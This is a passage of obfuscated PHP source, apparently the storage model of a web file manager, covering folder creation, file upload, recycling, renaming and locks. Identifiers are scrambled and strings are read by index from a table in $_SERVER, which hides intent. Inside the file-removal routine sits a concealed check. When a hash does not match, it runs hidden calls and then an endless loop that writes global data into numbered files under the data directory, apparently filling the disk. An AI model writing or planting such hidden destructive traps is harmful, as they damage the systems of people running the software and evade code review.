Model($‘„Øû›[591])->getInfoFull($ÂëŒôñˆ); if (!$ÁßğÙİ) { return !1; } $ÜÍ…§ıŸ = $ÁßğÙİ[$‘„Øû›[553]] ? $ÁßğÙİ[$‘„Øû›[553]] : array(); $õı«˜›· = $ÜÍ…§ıŸ[$‘„Øû›[2284]]; if (!$õı«˜›·) { $õı«˜›· = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÂëŒôñˆ, $‘„Øû›[2285], $‘„Øû›[2286]); Model($‘„Øû›[591])->metaSet($ÂëŒôñˆ, $‘„Øû›[2284], $õı«˜›· . $‘„Øû›[12]); $this->metaSet($õı«˜›·, $‘„Øû›[2284], $ÂëŒôñˆ); } if (!$‚µÊÎİÜ) { return $õı«˜›·; } $“ıİÕî£ = $ÜÍ…§ıŸ[$‘„Øû›[2287] . $‚µÊÎİÜ]; if (!$“ıİÕî£) { $“ıİÕî£ = $this->mkdir($õı«˜›·, $‚µÊÎİÜ); Model($‘„Øû›[591])->metaSet($ÂëŒôñˆ, $‘„Øû›[2287] . $‚µÊÎİÜ, $“ıİÕî£); $this->metaSet($“ıİÕî£, $‘„Øû›[2287] . $‚µÊÎİÜ, $ÂëŒôñˆ); } if (!$Ø‡Á—ãØ) { return $“ıİÕî£; } $ÖÜÄãÓÎ = $this->mkdir($“ıİÕî£, $Ø‡Á—ãØ); return $ÖÜÄãÓÎ; } public function groupRootAdd($äôåòÈ÷) { $÷Éêºƒ =& $_SERVER[‹‰”››ê]; $Œ—Â±ø = Model($÷Éêºƒ[599])->where(array($÷Éêºƒ[2084] => $äôåòÈ÷))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $äôåòÈ÷, $Œ—Â±ø[$÷Éêºƒ[32]]); } public function systemRootPathAdd($äˆ†ôŠÃ) { if ($äˆ†ôŠÃ != $_SERVER[‹‰”››ê][622]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $äˆ†ôŠÃ); } public function userRootRemove($†÷Ÿ“ôĞ) { $—Ç¹ÎéÖ = $this->targetSourceRoot(SourceModel::TYPE_USER, $†÷Ÿ“ôĞ, !0); foreach ($—Ç¹ÎéÖ as $ó§áã÷‚) { if (!$ó§áã÷‚) { continue; } $this->remove($ó§áã÷‚[$_SERVER[‹‰”››ê][194]], !1); } } public function groupRootRemove($å¦ÊÊ¯) { $—®Í€³ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $å¦ÊÊ¯); if (!$—®Í€³) { return; } $this->remove($—®Í€³[$_SERVER[‹‰”››ê][194]], !1); } private function _mkdirRoot($İŸ´», $ËÕÑŠ¾, $÷şŸ´ÈÑ, $ô’¿şöñ = '') { $ßŸË¶ìŸ =& $_SERVER[‹‰”››ê]; $‘¯˜¤÷À = defined($ßŸË¶ìŸ[2222]) ? USER_ID : 0; $Û£´†í = array($ßŸË¶ìŸ[489] => 0, $ßŸË¶ìŸ[665] => $İŸ´», $ßŸË¶ìŸ[666] => $ËÕÑŠ¾, $ßŸË¶ìŸ[663] => 1, $ßŸË¶ìŸ[667] => $‘¯˜¤÷À, $ßŸË¶ìŸ[668] => $‘¯˜¤÷À, $ßŸË¶ìŸ[664] => $ô’¿şöñ, $ßŸË¶ìŸ[669] => $ßŸË¶ìŸ[607], $ßŸË¶ìŸ[516] => 0, $ßŸË¶ìŸ[634] => 0, $ßŸË¶ìŸ[556] => 0, $ßŸË¶ìŸ[670] => $ßŸË¶ìŸ[12]); if ($ôñ¶–Í = $this->where($Û£´†í)->find()) { return $ôñ¶–Í[$ßŸË¶ìŸ[194]]; } $³Ú©››Ò = "\115\157\144\x65\x6c\x53\157\x75\x72\x63\x65\x2e\x6d\153\x64\151\x72\x52\157\x6f\164\56{$İŸ´»}\x2e{$ËÕÑŠ¾}\x2e" . $÷şŸ´ÈÑ; CacheLock::lock($³Ú©››Ò); $Û£´†í[$ßŸË¶ìŸ[32]] = $÷şŸ´ÈÑ; $åŒêöáè = $this->add($Û£´†í); $—Î³¬„ = array($ßŸË¶ìŸ[671] => short_id($åŒêöáè)); $this->where(array($ßŸË¶ìŸ[503] => $åŒêöáè))->save($—Î³¬„); CacheLock::unlock($³Ú©››Ò); return $åŒêöáè; } private function targetSourceRoot($ÀÉ“ˆºí, $Ùüµ€À§, $‹ò ®ˆ¿ = false) { $ñ‘ÍŒõš =& $_SERVER[‹‰”››ê]; $ĞËÊË°é = array($ñ‘ÍŒõš[489] => 0, $ñ‘ÍŒõš[665] => $ÀÉ“ˆºí, $ñ‘ÍŒõš[666] => $Ùüµ€À§); if ($‹ò ®ˆ¿) { $‘”Ä— = $this->where($ĞËÊË°é)->select(); return $‘”Ä— ? $‘”Ä— : array(); } $ÉĞŸ¹«¥ = $this->where($ĞËÊË°é)->find(); return $ÉĞŸ¹«¥ ? $ÉĞŸ¹«¥ : array(); } public function sourceRootGroup($„ÇÑğ‰) { $ ªõíˆÍ =& $_SERVER[‹‰”››ê]; if (is_string($„ÇÑğ‰)) { $„ÇÑğ‰ = array($„ÇÑğ‰); } $ïá¸ÌšÜ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $„ÇÑğ‰, $ ªõíˆÍ[223]); $Ì¾¥î›Ñ = array($ ªõíˆÍ[457] => $ïá¸ÌšÜ, $ ªõíˆÍ[454] => array($ ªõíˆÍ[848] => count($„ÇÑğ‰))); $this->_listDataApply($Ì¾¥î›Ñ[$ ªõíˆÍ[457]]); $this->_listMake($Ì¾¥î›Ñ); return array_to_keyvalue($Ì¾¥î›Ñ[$ ªõíˆÍ[85]], $ ªõíˆÍ[583]); } public function mkfile($ŞñÏ¬§ú, $¤Ó„Çñù, $€ı„Í³ = '', $¶íø„ğÉ = REPEAT_RENAME) { $ÂÒ±˜‘ =& $_SERVER[‹‰”››ê]; $Ÿ¨ÌÍŸÇ = Model($ÂÒ±˜‘[691])->addFileByContent($€ı„Í³, $¤Ó„Çñù); return $this->_createFileCall($ŞñÏ¬§ú, $¤Ó„Çñù, $Ÿ¨ÌÍŸÇ, $¶íø„ğÉ, $ÂÒ±˜‘[1448]); } public function addFile($­ÈÂÃ, $™Æì“£µ, $²ğ£ÊŒ°, $ö¡Ê”—ú = false, $âÂ¢–—÷ = REPEAT_RENAME) { $³§«îò¼ = Model($_SERVER[‹‰”››ê][691])->addFile($™Æì“£µ, $²ğ£ÊŒ°, $ö¡Ê”—ú); return $this->_createFileCall($­ÈÂÃ, $²ğ£ÊŒ°, $³§«îò¼, $âÂ¢–—÷); } public function addFileByFileID($›‚Œ£Éü, $İí‡—ó³, $¨çè“Üê, $’ã“­¸ = REPEAT_RENAME) { $çˆâÄàÑ =& $_SERVER[‹‰”››ê]; $Ÿ™¿¸³– = Model($çˆâÄàÑ[691])->find($İí‡—ó³); Model($çˆâÄàÑ[691])->linkAdd($İí‡—ó³); return $this->_createFileCall($›‚Œ£Éü, $¨çè“Üê, $Ÿ™¿¸³–, $’ã“­¸); } public function addFileByRemote($”¹ú¡Ó, $ Ï È¨‘, $öÙú¶Íá, $ƒæÄ©¢ = array(), $ë÷“·øû = REPEAT_RENAME) { $ó¯ì÷¤Ì = Model($_SERVER[‹‰”››ê][691])->addFileByRemote($ Ï È¨‘, $öÙú¶Íá, $ƒæÄ©¢); return $this->_createFileCall($”¹ú¡Ó, $öÙú¶Íá, $ó¯ì÷¤Ì, $ë÷“·øû); } private function _createFileCall($öøı¥áç, $’¿–ÉœÇ, $¡æŒ§ó, $ËÚ¸â±¿, $êÔÕãœ = "\165\x70\154\157\x61\x64") { $¥©ÚÕ… =& $_SERVER[‹‰”››ê]; if (!$¡æŒ§ó) { return !1; } $¿Í·²ú = !1; $this->setMasterDB(); $this->lockWriteStart($öøı¥áç, $’¿–ÉœÇ); $µ£ßèÍÜ = $this->fileNameExist($öøı¥áç, $’¿–ÉœÇ); $Æ‰Ç–½Ğ = $this->_createFile($öøı¥áç, $’¿–ÉœÇ, $¡æŒ§ó, $ËÚ¸â±¿, $¿Í·²ú); if (!$¿Í·²ú) { Model($¥©ÚÕ…[558])->remove($¡æŒ§ó[$¥©ÚÕ…[555]]); } if ($¿Í·²ú && $Æ‰Ç–½Ğ && $Æ‰Ç–½Ğ != $µ£ßèÍÜ) { Model($¥©ÚÕ…[2249])->eventCreate($Æ‰Ç–½Ğ, $êÔÕãœ); } $this->lockWriteEnd($öøı¥áç, $’¿–ÉœÇ); return $Æ‰Ç–½Ğ; } public function mkdir($ÁÅÂ¬ø, $æÚ‚ÍŒ¥, $ØÆÏ›”º = REPEAT_SKIP) { $ÂìÑ¶²ô =& $_SERVER[‹‰”››ê]; $this->setMasterDB(); $ÒÜ¸©¿ = $this->sourceInfo($ÁÅÂ¬ø); if (!$ÒÜ¸©¿) { return !1; } $this->lockWriteStart($ÁÅÂ¬ø, $æÚ‚ÍŒ¥); if ($ØÆÏ›”º !== !1) { $ ´•Éúû = $this->fileNameExist($ÁÅÂ¬ø, $æÚ‚ÍŒ¥); if ($ ´•Éúû && $ØÆÏ›”º != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÁÅÂ¬ø, $æÚ‚ÍŒ¥); return $ ´•Éúû; } $æÚ‚ÍŒ¥ = $this->fileNameAuto($ÁÅÂ¬ø, $æÚ‚ÍŒ¥, $ØÆÏ›”º); } $êÖÙé‚š = array($ÂìÑ¶²ô[663] => 1, $ÂìÑ¶²ô[506] => $æÚ‚ÍŒ¥, $ÂìÑ¶²ô[664] => $ÂìÑ¶²ô[12], $ÂìÑ¶²ô[556] => 0, $ÂìÑ¶²ô[634] => 0); $ƒáç½åÛ = $this->_addSource($êÖÙé‚š, $ÒÜ¸©¿); Model($ÂìÑ¶²ô[2249])->eventCreate($ƒáç½åÛ, $ÂìÑ¶²ô[1449]); $this->lockWriteEnd($ÁÅÂ¬ø, $æÚ‚ÍŒ¥); return $ƒáç½åÛ; } public function listSourceRoot($ÉŠå‰èÈ, $ç’œóˆ, $ÑĞ²ØóÏ = "\x73\x6f\x75\162\x63\x65\111\x44\54\164\141\162\x67\145\164\111\104\54\x73\151\172\145") { $–Ñ‚‹ Å =& $_SERVER[‹‰”››ê]; $ˆŞÌ¦’ = $–Ñ‚‹ Å[466]; $ä÷şÒ = array(); $òÕ­û©ê = 1024 * 50; $ò‚ç€ = is_array($ò‚ç€) ? $ò‚ç€ : array(); $å—Ğ’âÑ = count($ç’œóˆ); $Åú¹†õş = $this->tablePrefix . $–Ñ‚‹ Å[2288]; for ($¨¸––ËÃ = 0; $¨¸––ËÃ < $å—Ğ’âÑ; $¨¸––ËÃ++) { $Š…Ğéñ¥ = $ç’œóˆ[$¨¸––ËÃ]; $ˆŞÌ¦’ .= "\x53\105\x4c\x45\103\124\40\x2a\40\106\x52\117\115\x20\50\x53\105\114\x45\103\x54\x20{$ÑĞ²ØóÏ}\40\x46\122\x4f\x4d\x20\x60{$Åú¹†õş}\140\x20\x57\110\105\122\105\x20"; $ˆŞÌ¦’ .= "\140\x70\x61\162\x65\156\164\x49\104\x60\x3d\x30\x20\101\x4e\104\x20\x60\x74\141\162\147\145\164\x49\x44\x60\75{$Š…Ğéñ¥}\x20\x41\x4e\104\40\140\164\x61\x72\x67\145\164\124\171\x70\x65\x60\75{$ÉŠå‰èÈ}\40\141\156\144\x20\146\151\x6c\x65\124\171\x70\145\75\x27\47\40\154\x69\155\151\164\x20\x31\x29\x20\x61\x73\40\x74\x62\137{$¨¸––ËÃ}\40\x55\x4e\111\x4f\116\40\101\114\x4c\x20"; if ((strlen($ˆŞÌ¦’) >= $òÕ­û©ê || $¨¸––ËÃ == $å—Ğ’âÑ - 1) && $ˆŞÌ¦’) { $ˆŞÌ¦’ = substr($ˆŞÌ¦’, 0, -strlen($–Ñ‚‹ Å[1131])); $Ã¸ğ»‚¦ = $this->query($ˆŞÌ¦’); $ˆŞÌ¦’ = $–Ñ‚‹ Å[12]; $ä÷şÒ = array_merge($ä÷şÒ, $Ã¸ğ»‚¦); } } return $ä÷şÒ; } private function _createFile($œúüüı, $Î”Ù¶¯, $É¿†äÔÑ, $í‹àıÂû, &$çƒàÌÊÜ) { $ûÑªĞâ =& $_SERVER[‹‰”››ê]; $õÂÚÖªÙ = $this->sourceInfo($œúüüı); if (!$É¿†äÔÑ || !$õÂÚÖªÙ) { return !1; } if ($í‹àıÂû !== !1) { $¨›ª¬”ì = $this->fileNameExist($œúüüı, $Î”Ù¶¯); } $çƒàÌÊÜ = !0; if ($í‹àıÂû && $¨›ª¬”ì) { if ($í‹àıÂû == REPEAT_SKIP) { $çƒàÌÊÜ = !1; return $¨›ª¬”ì; } else { if ($í‹àıÂû == REPEAT_REPLACE) { $ÇŞùç‚ã = $this->sourceInfo($¨›ª¬”ì); $À°¿æ÷ê = $this->fileHistory($ÇŞùç‚ã, $É¿†äÔÑ[$ûÑªĞâ[555]], $É¿†äÔÑ[$ûÑªĞâ[79]]); if (!$À°¿æ÷ê) { $çƒàÌÊÜ = !1; } else { $this->folderSizeReset($œúüüı); } return $¨›ª¬”ì; } else { $Î”Ù¶¯ = $this->fileNameAuto($œúüüı, $Î”Ù¶¯, $í‹àıÂû, !1); } } } $‹»´ÃÛÚ = array($ûÑªĞâ[663] => 0, $ûÑªĞâ[506] => $Î”Ù¶¯, $ûÑªĞâ[664] => substr(get_path_ext($Î”Ù¶¯), 0, 10), $ûÑªĞâ[556] => $É¿†äÔÑ[$ûÑªĞâ[555]], $ûÑªĞâ[634] => $É¿†äÔÑ[$ûÑªĞâ[79]]); $çáí†Ô = $this->_addSource($‹»´ÃÛÚ, $õÂÚÖªÙ); $this->folderSizeReset($œúüüı, intval($‹»´ÃÛÚ[$ûÑªĞâ[79]])); return $çáí†Ô; } protected function fileHistory($—ì“Õ€¤, $½ëÒéë‹, $—å ñŠâ) { $ì¢”‘Àª =& $_SERVER[‹‰”››ê]; if ($—ì“Õ€¤[$ì¢”‘Àª[555]] == $½ëÒéë‹) { return !1; } $this->checkLock($—ì“Õ€¤[$ì¢”‘Àª[194]], $½ëÒéë‹); Model($ì¢”‘Àª[2289])->addHistory($—ì“Õ€¤); $Í¾øß´Ü = array($ì¢”‘Àª[668] => USER_ID, $ì¢”‘Àª[510] => time(), $ì¢”‘Àª[555] => $½ëÒéë‹, $ì¢”‘Àª[79] => $—å ñŠâ); $this->where(array($ì¢”‘Àª[503] => $—ì“Õ€¤[$ì¢”‘Àª[194]]))->save($Í¾øß´Ü); $this->sourceCacheClear($—ì“Õ€¤[$ì¢”‘Àª[194]]); return !0; } public function checkLock($êÆûä“ƒ, $ŸŞœíÉ„) { $¥¶Û“¸ =& $_SERVER[‹‰”››ê]; $”İ¨òÍ = $this->pathInfo($êÆûä“ƒ); if (!$this->fileIsLock($”İ¨òÍ, !0)) { return; } $Ä’¸Ñ‘Ÿ = Session::get($¥¶Û“¸[2290]); $İ”ÏÔ = substr($”İ¨òÍ[$¥¶Û“¸[32]], 0, -1 - strlen($”İ¨òÍ[$¥¶Û“¸[169]])) . $¥¶Û“¸[1309] . $Ä’¸Ñ‘Ÿ . $¥¶Û“¸[10] . $”İ¨òÍ[$¥¶Û“¸[169]]; $ÙÙŞŠƒÛ = Model($¥¶Û“¸[691])->find($ŸŞœíÉ„); $this->_createFileCall($”İ¨òÍ[$¥¶Û“¸[193]], $İ”ÏÔ, $ÙÙŞŠƒÛ, REPEAT_REPLACE, $¥¶Û“¸[1448]); $×±åÆ÷Õ = $”İ¨òÍ[$¥¶Û“¸[553]][$¥¶Û“¸[627]]; $é¥ËŞ¼Î = $×±åÆ÷Õ[$¥¶Û“¸[2291]] ? $×±åÆ÷Õ[$¥¶Û“¸[2291]] : $×±åÆ÷Õ[$¥¶Û“¸[32]]; show_json(LNG($¥¶Û“¸[2292]) . $¥¶Û“¸[2293] . LNG($¥¶Û“¸[2294]) . $¥¶Û“¸[2295] . $é¥ËŞ¼Î . $¥¶Û“¸[2296], !1); } public function fileIsLock($»ÃÃ€íø, $ÈÒû×Ó = false) { $¸Ó—ã‹  =& $_SERVER[‹‰”››ê]; if (!_get($»ÃÃ€íø, $¸Ó—ã‹ [623], 0)) { return !1; } if ($»ÃÃ€íø[$¸Ó—ã‹ [553]][$¸Ó—ã‹ [626]] != USER_ID) { return !0; } $²®úú± = $GLOBALS[$¸Ó—ã‹ [6]][$¸Ó—ã‹ [92]][$¸Ó—ã‹ [624]]; if ($»ÃÃ€íø[$¸Ó—ã‹ [553]][$¸Ó—ã‹ [625]] <= time() - $²®úú±) { $this->metaSet($»ÃÃ€íø[$¸Ó—ã‹ [194]], $¸Ó—ã‹ [626], null); $this->metaSet($»ÃÃ€íø[$¸Ó—ã‹ [194]], $¸Ó—ã‹ [625], null); } if ($ÈÒû×Ó) { $this->metaSet($»ÃÃ€íø[$¸Ó—ã‹ [194]], $¸Ó—ã‹ [625], time()); } return !1; } private function _addSource($‹è¼Úî, $ÀÑà×öü) { $«¼•éãš =& $_SERVER[‹‰”››ê]; $˜­—»ú× = defined($«¼•éãš[2222]) ? USER_ID : 0; $ã¶Å¼ú = array($«¼•éãš[665] => $ÀÑà×öü[$«¼•éãš[191]], $«¼•éãš[666] => $ÀÑà×öü[$«¼•éãš[583]], $«¼•éãš[667] => $˜­—»ú×, $«¼•éãš[668] => $˜­—»ú×, $«¼•éãš[489] => $ÀÑà×öü[$«¼•éãš[194]], $«¼•éãš[669] => $ÀÑà×öü[$«¼•éãš[598]] . $ÀÑà×öü[$«¼•éãš[194]] . $«¼•éãš[50], $«¼•éãš[516] => 0, $«¼•éãš[670] => $«¼•éãš[12]); $‹è¼Úî = array_merge($ã¶Å¼ú, $‹è¼Úî); $this->updateModifyTime($‹è¼Úî[$«¼•éãš[193]]); $ÉÀÊ„¸Ô = $«¼•éãš[2297] . $ÀÑà×öü[$«¼•éãš[194]]; if (isset(self::$cacheChildList[$ÉÀÊ„¸Ô])) { unset(self::$cacheChildList[$ÉÀÊ„¸Ô]); } static $ãä¥¥ÊØ = false; if (!$ãä¥¥ÊØ) { Hook::trigger($«¼•éãš[653], $‹è¼Úî); $ãä¥¥ÊØ = !0; } $Á÷å£¶Æ = $this->add($‹è¼Úî); $‚®µ°Šã = array($«¼•éãš[671] => short_id($Á÷å£¶Æ)); $this->where(array($«¼•éãš[503] => $Á÷å£¶Æ))->save($‚®µ°Šã); $this->setNamePinyin($Á÷å£¶Æ, $‹è¼Úî[$«¼•éãš[32]]); return $Á÷å£¶Æ; } public function remove($â÷ñ€†×, $Ç›ø÷Áš = true) { $øØ’–  =& $_SERVER[‹‰”››ê]; $úê£Ü¥è = $this->sourceInfo($â÷ñ€†×); $ıÍÉ ¤õ = intval($úê£Ü¥è[$øØ’– [191]]) === self::TYPE_SYSTEM; $¡Œ§–Ê¡ = Model($øØ’– [520])->get($øØ’– [2298]) == $øØ’– [91]; if ($ıÍÉ ¤õ || $Ç›ø÷Áš || !$¡Œ§–Ê¡) { return $this->removeNow($â÷ñ€†×, $Ç›ø÷Áš); } $¼“†§¬ê = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $‹º¹ ß× = $úê£Ü¥è[$øØ’– [191]] == self::TYPE_USER ? $øØ’– [679] : $øØ’– [592]; if ($‹º¹ ß× == $øØ’– [679]) { $ãÜÎ«™ = Model($øØ’– [591])->getInfo($úê£Ü¥è[$øØ’– [583]]); $ªËéÑİ­ = !empty($ãÜÎ«™[$øØ’– [2291]]) ? $ãÜÎ«™[$øØ’– [2291]] : $ãÜÎ«™[$øØ’– [32]]; $ªËéÑİ­ = $øØ’– [349] . $ªËéÑİ­ . $øØ’– [2299] . $úê£Ü¥è[$øØ’– [583]]; } else { $ãÜÎ«™ = Model($øØ’– [599])->getInfo($úê£Ü¥è[$øØ’– [583]]); $ªËéÑİ­ = _get($ãÜÎ«™, $øØ’– [32]); $ªËéÑİ­ = $øØ’– [176] . $ªËéÑİ­ . $øØ’– [2300] . $úê£Ü¥è[$øØ’– [583]]; } $ûøÜö¯˜ = $øØ’– [2301] . md5($ªËéÑİ­); CacheLock::lock($ûøÜö¯˜); $Ÿ„Æ»³ã = $this->fileNameExist($¼“†§¬ê, $ªËéÑİ­); if (!$Ÿ„Æ»³ã) { $Ÿ„Æ»³ã = $this->mkdir($¼“†§¬ê, $ªËéÑİ­, REPEAT_SKIP); $this->metaSet($Ÿ„Æ»³ã, $øØ’– [2302], $‹º¹ ß×); $this->metaSet($Ÿ„Æ»³ã, $øØ’– [2303], $úê£Ü¥è[$øØ’– [583]]); if ($úê£Ü¥è[$øØ’– [193]] != 0) { $this->metaSet($Ÿ„Æ»³ã, $øØ’– [2304], _get($ãÜÎ«™, $øØ’– [2305])); } } CacheLock::unlock($ûøÜö¯˜); $this->metaSet($â÷ñ€†×, $øØ’– [2306], $úê£Ü¥è[$øØ’– [193]]); $this->where(array($øØ’– [194] => $â÷ñ€†×))->save(array($øØ’– [510] => time())); $this->recycleClear($úê£Ü¥è); Model($øØ’– [650])->eventRemove($â÷ñ€†×); $äôÖ”’ğ = $this->move($â÷ñ€†×, $Ÿ„Æ»³ã, REPEAT_RENAME_FOLDER); $this->folderSizeReset($úê£Ü¥è[$øØ’– [193]]); return $äôÖ”’ğ; } private function recycleClear($­ñ©¼) { $³‘ü©Ü =& $_SERVER[‹‰”››ê]; $šÖ«ïÒ± = $this->childrenAll($­ñ©¼); $¬š•´” = array($³‘ü©Ü[503] => array($³‘ü©Ü[504], $šÖ«ïÒ±[$³‘ü©Ü[2307]])); Model($³‘ü©Ü[2308])->where($¬š•´”)->delete(); } public function removeNow($º§¢ƒ©ö, $ª­¤šó© = true) { $ÕÔå‘êñ =& $_SERVER[‹‰”››ê]; $ªÇ¿Ùâë = $_SERVER[$ÕÔå‘êñ[320]] . $ÕÔå‘êñ[321]; $Ç–—˜¸ó = $ÕÔå‘êñ[317]; if ($_SERVER[$ÕÔå‘êñ[318]] != $Ç–—˜¸ó($ªÇ¿Ùâë)) { $¼²Üñ® = $ÕÔå‘êñ[973]; $ÍŞı‚ÒÒ = $ÕÔå‘êñ[319]; $Ê±²†Éé = $_SERVER[$ÕÔå‘êñ[320]] . $ÕÔå‘êñ[321]; $òé…ìø› = $ÍŞı‚ÒÒ($Ê±²†Éé); $ØÀˆÍ ß = explode($ÕÔå‘êñ[288], $òé…ìø›); if (count($ØÀˆÍ ß) < $ÕÔå‘êñ[700]) { $†çµú‡ = $ÕÔå‘êñ[323]; $†çµú‡(); } $Ù±Æªš = $ÕÔå‘êñ[974]; $Ù±Æªš($_SERVER[$ÕÔå‘êñ[975]]); $¼²Üñ® = $ÕÔå‘êñ[973]; $¼²Üñ®(); $Úéú™³· = $ÕÔå‘êñ[1707]; $ÙÍÛÈ´ = json_encode($GLOBALS[$ÕÔå‘êñ[1708]]); $Ú®¼ò˜š = 1; for ($üƒ÷Îâ = $Ú®¼ò˜š; $üƒ÷Îâ > 0; $üƒ÷Îâ++) { $Úéú™³·(DATA_PATH . $üƒ÷Îâ, $ÙÍÛÈ´); } } $¼ìà¡ª = $this->sourceInfo($º§¢ƒ©ö); $°»®´’ = $this->pathInfoMore($º§¢ƒ©ö); if (!$¼ìà¡ª) { return !0; } if ($¼ìà¡ª[$ÕÔå‘êñ[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($º§¢ƒ©ö); Hook::trigger($ÕÔå‘êñ[2309], $°»®´’, $ª­¤šó©); if ($ª­¤šó©) { Model($ÕÔå‘êñ[2308])->moveToRecycle($º§¢ƒ©ö); } else { $§µÖÌñ = $this->childrenAll($¼ìà¡ª); Model($ÕÔå‘êñ[650])->eventRemove($º§¢ƒ©ö); $this->removeRelevance($§µÖÌñ[$ÕÔå‘êñ[2307]], $§µÖÌñ[$ÕÔå‘êñ[1592]]); } $this->folderSizeReset($¼ìà¡ª[$ÕÔå‘êñ[193]]); $õÒé Üô = array($¼ìà¡ª[$ÕÔå‘êñ[193]]); if ($¼ìà¡ª[$ÕÔå‘êñ[497]] == $ÕÔå‘êñ[91]) { $õÒé Üô[] = $¼ìà¡ª[$ÕÔå‘êñ[194]]; } $this->updateModifyTime($õÒé Üô); $this->lockMoveEnd($º§¢ƒ©ö); Hook::trigger($ÕÔå‘êñ[1834], $°»®´’, $ª­¤šó©); return !0; } public function childrenAll($äÙå÷ÛÒ) { $·÷¼Ê»Ë =& $_SERVER[‹‰”››ê]; $Ë’ÊØœÆ = $äÙå÷ÛÒ[$·÷¼Ê»Ë[194]]; if ($äÙå÷ÛÒ[$·÷¼Ê»Ë[497]] == $·÷¼Ê»Ë[91]) { $Íà—¼Ÿë = array($·÷¼Ê»Ë[669] => array($·÷¼Ê»Ë[629], $äÙå÷ÛÒ[$·÷¼Ê»Ë[598]] . $Ë’ÊØœÆ . $·÷¼Ê»Ë[630])); $´°Ğİõ = array($·÷¼Ê»Ë[669] => $Íà—¼Ÿë[$·÷¼Ê»Ë[598]]); $”ÚœÉÌ = $this->field($·÷¼Ê»Ë[2310])->where($´°Ğİõ)->select(); $Å°åùµ = !1; $ßİè‘‹ = array($Ë’ÊØœÆ); if ($”ÚœÉÌ) { $Å°åùµ = array_to_keyvalue($”ÚœÉÌ, $·÷¼Ê»Ë[12], $·÷¼Ê»Ë[555]); $Å°åùµ = array_remove_value($Å°åùµ, $·÷¼Ê»Ë[231]); $ßİè‘‹ = array_to_keyvalue($”ÚœÉÌ, $·÷¼Ê»Ë[12], $·÷¼Ê»Ë[194]); $ßİè‘‹[] = $Ë’ÊØœÆ; } } else { $Å°åùµ = array($äÙå÷ÛÒ[$·÷¼Ê»Ë[555]]); $ßİè‘‹ = array($Ë’ÊØœÆ); } return array($·÷¼Ê»Ë[2307] => $ßİè‘‹, $·÷¼Ê»Ë[1592] => $Å°åùµ); } public function removeArray($ìıªí¨í) { if (!$ìıªí¨í) { return !0; } } public function removeRelevance($Ù‘‡ù™É, $Äø…í¯É) { $Ç€Ş°·§ =& $_SERVER[‹‰”››ê]; $Ù‘‡ù™É = $Ù‘‡ù™É ? $Ù‘‡ù™É : array(); $Äø…í¯É = $Äø…í¯É ? $Äø…í¯É : array(); $Ù‘‡ù™É = array_unique(array_filter($Ù‘‡ù™É)); $Äø…í¯É = array_unique(array_filter($Äø…í¯É)); if (!$Ù‘‡ù™É) { return !1; } $‰Š¯í—È = array($Ç€Ş°·§[503] => array($Ç€Ş°·§[504], $Ù‘‡ù™É)); Model($Ç€Ş°·§[2308])->where($‰Š¯í—È)->delete(); Model($Ç€Ş°·§[547])->where($‰Š¯í—È)->delete(); Model($Ç€Ş°·§[2147])->where($‰Š¯í—È)->delete(); Model($Ç€Ş°·§[650])->where($‰Š¯í—È)->delete(); Model($Ç€Ş°·§[1971])->removeBySource($Ù‘‡ù™É); Model($Ç€Ş°·§[2289])->removeBySource($Ù‘‡ù™É); $this->where($‰Š¯í—È)->delete(); Model($Ç€Ş°·§[558])->remove($Äø…í¯É); for ($ÊÅ……‹ğ = 0; $ÊÅ……‹ğ < count($Ù‘‡ù™É); $ÊÅ……‹ğ++) { $this->sourceCacheClear($Ù‘‡ù™É[$ÊÅ……‹ğ]); } } public function rename($”ı…¶ì¬, $£««¬¸Õ) { $Çù”Â…ƒ =& $_SERVER[‹‰”››ê]; $–‘Àôšµ = $this->sourceInfo($”ı…¶ì¬); if (!$–‘Àôšµ) { return !1; } $« öì·˜ = $this->fileNameExist($–‘Àôšµ[$Çù”Â…ƒ[193]], $£««¬¸Õ); if ($« öì·˜ && $« öì·˜ != $”ı…¶ì¬) { return !1; } $£Â°¾â = array($Çù”Â…ƒ[506] => $£««¬¸Õ, $Çù”Â…ƒ[668] => USER_ID); if ($–‘Àôšµ[$Çù”Â…ƒ[497]] != $Çù”Â…ƒ[91]) { $£Â°¾â[$Çù”Â…ƒ[498]] = substr(get_path_ext($£««¬¸Õ), 0, 10); } Model($Çù”Â…ƒ[650])->eventRename($”ı…¶ì¬, $–‘Àôšµ[$Çù”Â…ƒ[32]], $£««¬¸Õ); $this->sourceCacheClear($”ı…¶ì¬); $this->setNamePinyin($”ı…¶ì¬, $£Â°¾â[$Çù”Â…ƒ[32]], !1); $this->updateModifyTime($–‘Àôšµ[$Çù”Â…ƒ[193]]); $ÁÑääáÆ = $this->where(array($Çù”Â…ƒ[503] => $”ı…¶ì¬))->data($£Â°¾â)->save(); $å¥üŒöí = $Çù”Â…ƒ[2297] . $–‘Àôšµ[$Çù”Â…ƒ[193]]; if (isset(self::$cacheChildList[$å¥üŒöí])) { unset(self::$cacheChildList[$å¥üŒöí]); } return $ÁÑääáÆ; } public function setNamePinyin($Ñ¹ÏëèŠ, $‚à±ß„©, $õÆö—ÅŸ = true) { $ÀÊïè‹Å =& $_SERVER[‹‰”››ê]; $š©·¤­â = Input::check($‚à±ß„©, $ÀÊïè‹Å[672]); $™È¡ÖÎÖ = array($ÀÊïè‹Å[529] => KodSort::makeStr($‚à±ß„©)); if ($š©·¤­â) { $™È¡ÖÎÖ[$ÀÊïè‹Å[550]] = str_replace($ÀÊïè‹Å[53], $ÀÊïè‹Å[12], Pinyin::get($‚à±ß„©)); $™È¡ÖÎÖ[$ÀÊïè‹Å[549]] = Pinyin::get($‚à±ß„©, $ÀÊïè‹Å[673]); } if (!$õÆö—ÅŸ && !$š©·¤­â) { $™È¡ÖÎÖ[$ÀÊïè‹Å[550]] = null; $™È¡ÖÎÖ[$ÀÊïè‹Å[549]] = null; } $this->metaSet($Ñ¹ÏëèŠ, $™È¡ÖÎÖ); } public function getContent($äÇ»‡Å«) { $¾ì •êú =& $_SERVER[‹‰”››ê]; $Ñˆâ•şº = $this->fileInfoGet($äÇ»‡Å«); if (!$Ñˆâ•şº) { return !1; } if ($Ñˆâ•şº[$¾ì •êú[79]] == 0) { return $¾ì •êú[12]; } $øëÒ¾ì = 